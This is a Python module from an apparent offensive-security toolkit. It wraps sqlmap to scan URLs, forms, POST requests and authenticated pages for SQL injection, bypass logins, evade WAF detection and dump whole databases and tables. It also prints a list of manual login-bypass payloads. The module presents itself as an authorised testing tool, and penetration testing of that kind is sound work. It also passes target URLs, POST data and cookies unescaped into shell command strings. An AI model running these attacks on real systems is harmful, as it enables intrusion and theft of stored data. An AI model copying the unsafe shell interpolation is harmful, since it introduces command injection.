"""
SQL Injection testing module for T.
Uses SQLmap with targeted configurations for different injection scenarios.
All testing must be performed on systems you own or have explicit written permission to test.
"""

from typing import AsyncIterator
from offensive.vm_bridge import vm
from core.logger import get_logger

log = get_logger("offensive.sqli")

_PATH = "PATH=$PATH:$HOME/.local/bin:/usr/local/bin "


# ── Core injection tests ───────────────────────────────────────────────────────

async def test_url(url: str, level: int = 2, risk: int = 2) -> AsyncIterator[str]:
    """
    Test a URL parameter for SQL injection.
    level: 1-5 (depth of tests, higher = more thorough)
    risk:  1-3 (aggressiveness, higher = more intrusive)
    """
    yield f"[T] SQL injection test: {url}"
    yield f"    Level: {level} | Risk: {risk}"
    yield "─" * 60

    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--batch "
        f"--level={level} "
        f"--risk={risk} "
        f"--no-cast "
        f"--random-agent "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def test_forms(url: str) -> AsyncIterator[str]:
    """
    Automatically detect and test all forms on a page for SQL injection.
    Useful for login forms, search boxes, contact forms.
    """
    yield f"[T] Form-based SQL injection test: {url}"
    yield "─" * 60
    yield "Crawling page for forms..."

    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--forms "
        f"--batch "
        f"--level=2 "
        f"--risk=2 "
        f"--random-agent "
        f"--crawl=2 "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def test_login_bypass(
    url: str, user_field: str = "username", pass_field: str = "password"
) -> AsyncIterator[str]:
    """
    Test a login form for SQL injection authentication bypass.
    Tests if the login can be bypassed without valid credentials.
    """
    yield f"[T] Login bypass test: {url}"
    yield f"    Fields: {user_field} / {pass_field}"
    yield "─" * 60

    # First test with SQLmap
    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--data='{user_field}=test&{pass_field}=test' "
        f"--batch "
        f"--level=3 "
        f"--risk=2 "
        f"--technique=B "
        f"--random-agent "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=180):
        yield line

    # Also show manual bypass payloads for reference
    yield "\n[→] Common manual bypass payloads to test:"
    payloads = [
        ("Username field", "' OR 1=1--",           "Basic OR bypass"),
        ("Username field", "admin'--",              "Comment bypass as admin"),
        ("Username field", "' OR 'x'='x",           "Always-true condition"),
        ("Username field", "1' OR '1'='1",          "Numeric bypass"),
        ("Username field", "' OR 1=1#",             "MySQL comment bypass"),
        ("Password field", "anything' OR '1'='1",   "Password field bypass"),
    ]
    for field, payload, desc in payloads:
        yield f"  {field}: {payload}  ← {desc}"


async def dump_database(url: str, db_name: str = "") -> AsyncIterator[str]:
    """
    Dump database contents from a confirmed vulnerable endpoint.
    Only run after confirming injection is present.
    """
    yield f"[T] Database dump: {url}"
    yield "─" * 60

    db_flag = f"--dbms=mysql -D {db_name} --tables" if db_name else "--dbs"

    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--batch "
        f"{db_flag} "
        f"--random-agent "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def dump_table(url: str, db_name: str, table: str) -> AsyncIterator[str]:
    """Dump a specific table from a vulnerable endpoint."""
    yield f"[T] Table dump: {db_name}.{table}"
    yield "─" * 60

    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--batch "
        f"-D {db_name} -T {table} --dump "
        f"--random-agent "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def detect_waf(url: str) -> AsyncIterator[str]:
    """
    Detect Web Application Firewall before injection testing.
    Important — some WAFs block SQLmap and can get your IP banned.
    """
    yield f"[T] WAF detection: {url}"
    yield "─" * 60

    cmd1 = f"{_PATH}wafw00f {url} 2>/dev/null"
    async for line in vm.run(cmd1, timeout=20):
        yield line

    yield "\n[→] SQLmap WAF fingerprint..."
    cmd2 = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--batch --identify-waf --smart "
        f"--random-agent 2>/dev/null | "
        f"grep -iE 'waf|firewall|protected|identified|not detected' | head -5"
    )
    async for line in vm.run(cmd2, timeout=30):
        yield line


async def test_post_request(
    url: str, data: str, cookie: str = ""
) -> AsyncIterator[str]:
    """
    Test a POST request for SQL injection.
    data: POST body e.g. 'id=1&name=test'
    cookie: session cookie if authentication required
    """
    yield f"[T] POST injection test: {url}"
    yield f"    Data: {data}"
    yield "─" * 60

    cookie_flag = f"--cookie='{cookie}'" if cookie else ""
    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--data='{data}' "
        f"{cookie_flag} "
        f"--batch "
        f"--level=2 --risk=2 "
        f"--random-agent "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def test_authenticated(
    url: str, cookie: str, level: int = 3
) -> AsyncIterator[str]:
    """
    Test a URL that requires authentication (session cookie).
    Use this after logging in manually and copying your session cookie.
    """
    yield f"[T] Authenticated injection test: {url}"
    yield "─" * 60

    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--cookie='{cookie}' "
        f"--batch "
        f"--level={level} --risk=2 "
        f"--random-agent "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def quick_scan(url: str) -> AsyncIterator[str]:
    """
    Fast SQL injection check — low noise, quick result.
    Good for initial assessment before deeper testing.
    """
    yield f"[T] Quick SQLi scan: {url}"
    yield "─" * 60

    cmd = (
        f"{_PATH}sqlmap -u '{url}' "
        f"--batch "
        f"--level=1 --risk=1 "
        f"--technique=BEUST "
        f"--random-agent "
        f"--smart "
        f"--output-dir=/tmp/sqlmap_out "
        f"2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=120):
        yield line
